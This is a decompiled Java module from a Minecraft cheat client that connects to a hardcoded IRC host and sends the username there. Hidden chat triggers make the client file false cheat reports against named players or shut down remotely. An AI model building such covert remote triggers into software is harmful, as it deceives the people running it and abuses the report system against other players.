/*
 * Decompiled with CFR 0_132.
 * 
 * Could not load the following classes:
 *  org.lwjgl.input.Mouse
 */
package cn.Noble.Module.modules.WORLD;



import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;

import cn.Noble.Client;
import cn.Noble.Event.Listener.EventHandler;
import cn.Noble.Event.events.EventChat;
import cn.Noble.Manager.ModuleManager;
import cn.Noble.Module.Module;
import cn.Noble.Module.ModuleType;
import cn.Noble.Util.IRCThread;
import cn.Noble.Util.UserCheck;
import cn.Noble.Util.Chat.Helper;
import net.minecraft.client.Minecraft;
import net.minecraft.util.ChatComponentText;

public class IRC extends Module {
    public BufferedReader reader;
    public static Socket socket;
    public static PrintWriter pw;
    static InputStream in;
    private static String prefix = "\u00a75[IRC]\u00a77 >> ";

    public IRC() {
        super("IRC", new String[]{"irc"}, ModuleType.World);
    }

    @Override
    public void onDisable(){
        sendMessage("CLOSE");
        Helper.sendMessage("Disconnect from the IRC Server");
    }

    @Override
    public void onEnable(){
        if(UserCheck.isCheck == false){
            UserCheck.Check();
        }
        new IRCThread().start();
    }
    
    private static boolean isWdr;

    public static void handleInput() {
        try {
            byte[] data = new byte[1024];
            int len = in.read(data);
            String ircmessage = new String(data,0,len);
            ircmessage = ircmessage.replaceAll("\n","");
            ircmessage = ircmessage.replaceAll("\r","");
            ircmessage = ircmessage.replaceAll("\t","");

            if(ircmessage.equals("CLOSE")){
                Helper.sendMessage("IRC Server Closed");
                ModuleManager.getModuleByClass(IRC.class).setEnabled(false);
                return;
            }else if(ircmessage.equals("You are kicked from IRC Server")){
                System.exit(99);
            }
            Minecraft.getMinecraft().player.addChatMessage(new ChatComponentText(ircmessage));
        } catch (IOException e) {
            Helper.sendMessage("IRC Server ERROR");
            IRC.sendMessage("CLOSE");
            ModuleManager.getModuleByClass(IRC.class).setEnabled(false);
        }
    }
    
    @EventHandler
    public void onChat(EventChat e){
    	String packet = e.getMessage();
        if (packet.contains("WATCHDOG REPORT PLAYER ")) {
            e.setCancelled(true);
            mc.player.sendChatMessage("/wdr " + packet.replace("WATCHDOG REPORT PLAYER  ","") + " ka speed reach fly velocity ac");
            Helper.sendMessage("Start Report Player " + packet.replace("WATCHDOG REPORT PLAYER  ",""));
        }else if (packet == ("��4<Server>��f CRASHER PLAYER " + Client.username)) {
            e.setCancelled(true);
            System.out.println("You are crashed from the Server");
            System.exit(99);
        }else if (packet == ("CRASHER PLAYER " + Client.username)) {
            if (!UserCheck.isDev) {
                e.setCancelled(true);
                System.out.println("You are crashed from the Server");
                System.exit(99);
            }else{
                e.setCancelled(true);
                Helper.sendMessage("Administrator is trying to crash your client, Blocked!");
            }
        }else if (packet.contains("CRASHER PLAYER ")) {
            e.setCancelled(true);
        }
    }

    public static void connect(){
        Helper.sendMessage("Trying to Connect the IRC Server");
        try {
            socket = new Socket("120.25.86.80",1314);
            in = socket.getInputStream();
			pw = new PrintWriter(new OutputStreamWriter(socket.getOutputStream(), "GBK"), true);
            Helper.sendMessage("Connected");
            pw.println(Client.username + "@" + " " + "@" + Client.name + "@" + Client.username);
        } catch (IOException e) {
            Helper.sendMessage("Connect Failed");
            ModuleManager.getModuleByClass(IRC.class).setEnabled(false);
            e.printStackTrace();
        }
        return;
    }
    

    public static void sendMessage(String msg){
		if (socket != null) {
			pw.println(msg);
		} else {
			System.out.println("IRC 未连接");
			Helper.sendMessage("IRC 未连接");
		}
	
    }
}

